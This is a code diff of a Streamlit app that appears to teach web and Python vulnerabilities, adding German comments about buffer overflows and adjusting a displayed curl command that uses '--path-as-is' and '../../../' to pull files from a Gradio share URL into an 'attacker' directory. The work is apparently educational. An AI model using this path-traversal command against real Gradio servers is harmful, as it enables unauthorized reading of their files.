@@ -24,7 +24,8 @@ with tab1:
         - Denial of Service (DoS) and Distributed Denial of Service (DDoS)
         - Remote Code Execution (RCE)
         - Path traversal or ../ 
-        """)
+        """) # Buffer overflows sin eher ein Problem in C und Python basiert auf C richtig? Vllt lieber auf direkte vulnerabilities in Python konzentrieren?
+        # Oder mit erklären warum das ein Problem ist.
 
     with col2:
         st.markdown("#")
@@ -75,8 +76,8 @@ with tab2:
             run_py_script("gradio_app.py")
 
     with col2:
-        dummy_cmd = st.text_input(label="file/path/from/gradio", placeholder = 'https://xxxxxx..xx.gradio.live/file=/tmp/gradio/xxxxx')
-        st.write("curl --list-only --path-as-is", dummy_cmd, "/../../../path/to/asset.jpeg --output /attacker/home/path/image_copy.jpeg")
+        dummy_cmd = st.text_input(label="file/path/from/gradio", placeholder = 'https://xxxxxx..xx.gradio.live/file=/tmp/gradio/xxxxx/')
+        st.write("curl --list-only --path-as-is", dummy_cmd, "../../../path/to/asset.jpeg --output /attacker/home/path/image_copy.jpeg")
         
         content = st_ace(language='css', theme="terminal", wrap=True)
 
